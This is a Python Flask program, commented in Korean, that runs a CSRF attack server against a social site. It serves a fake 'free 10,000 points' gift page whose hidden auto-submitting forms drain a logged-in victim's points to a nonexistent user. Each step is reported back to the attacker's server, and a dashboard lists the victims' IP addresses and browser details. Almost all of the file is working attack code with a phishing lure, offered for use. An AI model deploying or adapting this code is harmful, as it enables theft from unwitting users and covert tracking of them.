#!/usr/bin/env python3
"""
CSRF 공격자 서버 v2 (Flask)
모든 사용자의 포인트 탈취
"""

from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# 공격 로그 저장
attack_logs = []
stolen_points = 0
victims = {}

# 메인 대시보드
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎯 CSRF Attack Dashboard</title>
    <meta http-equiv="refresh" content="3">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { text-align: center; margin-bottom: 30px; font-size: 2.5em; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            backdrop-filter: blur(10px);
        }
        .stat-card h2 { font-size: 3em; margin: 10px 0; color: #4CAF50; }
        .stat-card p { font-size: 1.2em; opacity: 0.9; }
        .logs {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            max-height: 600px;
            overflow-y: auto;
        }
        .log-entry {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        .log-entry.victim { border-left-color: #ff9800; }
        .log-entry.points { border-left-color: #f44336; }
        .timestamp { font-size: 0.9em; opacity: 0.7; }
        .victim-table {
            width: 100%;
            margin-top: 20px;
            border-collapse: collapse;
        }
        .victim-table th {
            background: rgba(255,255,255,0.2);
            padding: 15px;
            text-align: left;
        }
        .victim-table td {
            padding: 12px 15px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .refresh-info {
            text-align: center;
            margin-top: 20px;
            opacity: 0.7;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎯 CSRF Attack Control Panel</h1>

        <div class="stats">
            <div class="stat-card">
                <p>💰 탈취한 포인트</p>
                <h2>{{ stolen_points }}</h2>
            </div>
            <div class="stat-card">
                <p>👥 피해자 수</p>
                <h2>{{ victim_count }}</h2>
            </div>
            <div class="stat-card">
                <p>📊 총 공격 시도</p>
                <h2>{{ total_attacks }}</h2>
            </div>
        </div>

        <div class="logs">
            <h2>📋 실시간 공격 로그</h2>
            {% if attack_logs %}
                {% for log in attack_logs[::-1][:20] %}
                <div class="log-entry {{ log.type }}">
                    <div class="timestamp">{{ log.timestamp }}</div>
                    <div><strong>{{ log.event }}</strong></div>
                    {% if log.details %}
                    <div style="margin-top: 5px; font-size: 0.9em; opacity: 0.8;">
                        {{ log.details }}
                    </div>
                    {% endif %}
                </div>
                {% endfor %}
            {% else %}
                <p style="text-align: center; opacity: 0.5; padding: 40px;">
                    대기 중... 피해자가 fake-gift 링크를 클릭하면 여기에 표시됩니다.
                </p>
            {% endif %}
        </div>

        {% if victims %}
        <div class="logs" style="margin-top: 20px;">
            <h2>👥 피해자 목록</h2>
            <table class="victim-table">
                <thead>
                    <tr>
                        <th>IP</th>
                        <th>User-Agent</th>
                        <th>탈취 포인트</th>
                        <th>마지막 접속</th>
                    </tr>
                </thead>
                <tbody>
                    {% for ip, data in victims.items() %}
                    <tr>
                        <td>{{ ip }}</td>
                        <td>{{ data.user_agent[:50] }}...</td>
                        <td><strong>{{ data.points }}P</strong></td>
                        <td>{{ data.last_seen }}</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
        {% endif %}

        <div class="refresh-info">⟳ 3초마다 자동 새로고침</div>
    </div>
</body>
</html>
"""

# fake-gift 페이지
FAKE_GIFT_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>🎁 무료 포인트 받기!</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            margin: 0;
        }
        .gift-box {
            background: white;
            color: #333;
            padding: 50px;
            border-radius: 20px;
            max-width: 500px;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }
        h1 { color: #667eea; font-size: 2.5em; margin-bottom: 20px; }
        .gift-icon { font-size: 100px; animation: bounce 1s infinite; }
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }
        #status {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
        }
        .progress-bar {
            background: #e0e0e0;
            border-radius: 10px;
            height: 20px;
            margin: 20px 0;
            overflow: hidden;
        }
        .progress-fill {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100%;
            width: 0%;
            transition: width 0.3s;
        }
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">포인트 처리 중...</div>
        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>
    </div>

    <div id="csrfForms"></div>

    <script>
        const TARGET_SNS = 'http://{{ target_ip }}';
        const ATTACKER_SERVER = 'http://{{ attacker_server }}';

        console.log('[+] Attack Started');

        // 페이지 로드 알림
        fetch(ATTACKER_SERVER + '/notify?event=page_loaded', {mode: 'no-cors'}).catch(() => {});

        // CSRF 공격 - 포인트 대량 차감 (999번 유령 사용자에게 전송)
        (function() {
            // 다양한 금액으로 반복 전송 (피해자 포인트 모두 빼기)
            const amounts = [50000, 30000, 20000, 10000, 5000, 3000, 2000, 1000, 500, 300, 200, 100, 50, 10];

            let html = '';
            let formIndex = 0;
            let totalPoints = 0;

            amounts.forEach((amount) => {
                totalPoints += amount;
                // receiver_id = 999 (존재하지 않는 사용자)
                // → 포인트는 차감되지만 받는 사람이 없어서 사라짐
                html += `
                    <form id="form${formIndex}" method="POST" action="${TARGET_SNS}/profile.php" target="iframe${formIndex}">
                        <input type="hidden" name="send_gift" value="1">
                        <input type="hidden" name="receiver_id" value="999">
                        <input type="hidden" name="gift_type" value="diamond">
                        <input type="hidden" name="points" value="${amount}">
                        <input type="hidden" name="message" value="Event">
                    </form>
                    <iframe name="iframe${formIndex}" style="display:none;"></iframe>
                `;
                formIndex++;
            });

            document.getElementById('csrfForms').innerHTML = html;

            // 공격자 서버에 피해자 정보 전송
            fetch(ATTACKER_SERVER + '/victim?points=' + totalPoints, {mode: 'no-cors'}).catch(() => {});

            // 폼 순차 제출
            const totalForms = formIndex;
            let submitted = 0;

            for (let i = 0; i < totalForms; i++) {
                setTimeout(() => {
                    const form = document.getElementById('form' + i);
                    if (form) {
                        form.submit();
                        submitted++;

                        const progress = Math.round((submitted / totalForms) * 100);
                        document.getElementById('progress').style.width = progress + '%';
                        document.getElementById('status').innerHTML = `처리 중... ${progress}%`;

                        console.log(`[+] Draining: ${amounts[i]}P (${submitted}/${totalForms})`);

                        // 공격자 서버에 포인트 추가
                        fetch(ATTACKER_SERVER + '/transfer?amount=' + amounts[i], {mode: 'no-cors'}).catch(() => {});
                    }
                }, i * 200);
            }

            // 완료
            setTimeout(() => {
                document.getElementById('status').innerHTML = '✅ 포인트가 지급되었습니다!<br>잠시 후 메인 페이지로 이동합니다...';
                document.getElementById('progress').style.width = '100%';

                fetch(ATTACKER_SERVER + '/complete?total=' + totalPoints, {mode: 'no-cors'}).catch(() => {});

                setTimeout(() => {
                    window.location.href = TARGET_SNS + '/index.php';
                }, 2000);
            }, totalForms * 200 + 1000);
        })();
    </script>
</body>
</html>
"""

@app.after_request
def after_request(response):
    """CORS 헤더 추가"""
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

@app.route('/')
def dashboard():
    """메인 대시보드"""
    return render_template_string(
        DASHBOARD_HTML,
        stolen_points=stolen_points,
        victim_count=len(victims),
        total_attacks=len(attack_logs),
        attack_logs=attack_logs,
        victims=victims
    )

@app.route('/fake-gift')
def fake_gift():
    """fake-gift 페이지"""
    target_ip = request.args.get('target', '52.78.221.104')
    attacker_server = f"{request.scheme}://{request.host}"

    log_event('page_served', 'fake-gift 페이지 제공', f'IP: {request.remote_addr}')

    return render_template_string(
        FAKE_GIFT_HTML,
        target_ip=target_ip,
        attacker_server=attacker_server
    )

@app.route('/notify')
def notify():
    """페이지 로드 알림"""
    event = request.args.get('event', 'unknown')
    log_event('notify', f'알림: {event}', f'IP: {request.remote_addr}')
    return jsonify({'status': 'ok'})

@app.route('/victim')
def victim():
    """피해자 정보 수집"""
    ip = request.remote_addr
    points = int(request.args.get('points', 0))
    user_agent = request.headers.get('User-Agent', 'Unknown')

    if ip not in victims:
        victims[ip] = {
            'points': 0,
            'user_agent': user_agent,
            'first_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }

    victims[ip]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    log_event(
        'victim',
        f'🎯 피해자 감지!',
        f'IP: {ip}, 예상 차감: {points}P'
    )

    return jsonify({'status': 'ok'})

@app.route('/transfer')
def transfer():
    """포인트 전송 알림"""
    global stolen_points

    amount = int(request.args.get('amount', 0))
    ip = request.remote_addr

    stolen_points += amount

    if ip in victims:
        victims[ip]['points'] = victims[ip].get('points', 0) + amount

    log_event(
        'points',
        f'💰 포인트 탈취!',
        f'IP: {ip}, +{amount}P (총: {stolen_points}P)'
    )

    return jsonify({'status': 'ok', 'total': stolen_points})

@app.route('/complete')
def complete():
    """공격 완료"""
    total = int(request.args.get('total', 0))
    ip = request.remote_addr

    log_event(
        'complete',
        f'✅ 공격 완료!',
        f'IP: {ip}, 시도한 차감: {total}P'
    )

    return jsonify({'status': 'ok'})

@app.route('/logs')
def logs():
    """로그 JSON으로 반환"""
    return jsonify({
        'stolen_points': stolen_points,
        'victims': len(victims),
        'logs': attack_logs
    })

@app.route('/reset')
def reset():
    """통계 초기화"""
    global stolen_points, attack_logs, victims
    stolen_points = 0
    attack_logs = []
    victims = {}
    log_event('system', '🔄 통계 초기화', 'Admin')
    return jsonify({'status': 'reset'})

def log_event(event_type, event, details=''):
    """이벤트 로깅"""
    attack_logs.append({
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'type': event_type,
        'event': event,
        'details': details
    })

    if len(attack_logs) > 500:
        attack_logs.pop(0)

    print(f"[{datetime.now().strftime('%H:%M:%S')}] {event} - {details}")

if __name__ == '__main__':
    print("="*60)
    print("🎯 CSRF Attack Server v2 Starting...")
    print("="*60)
    print("")
    print("📊 Dashboard: http://0.0.0.0:5000/")
    print("🎁 Fake Gift: http://0.0.0.0:5000/fake-gift")
    print("📋 Logs API:  http://0.0.0.0:5000/logs")
    print("🔄 Reset:     http://0.0.0.0:5000/reset")
    print("")
    print("="*60)

    log_event('system', '🚀 서버 시작', 'Port 5000')

    app.run(host='0.0.0.0', port=5000, debug=False)
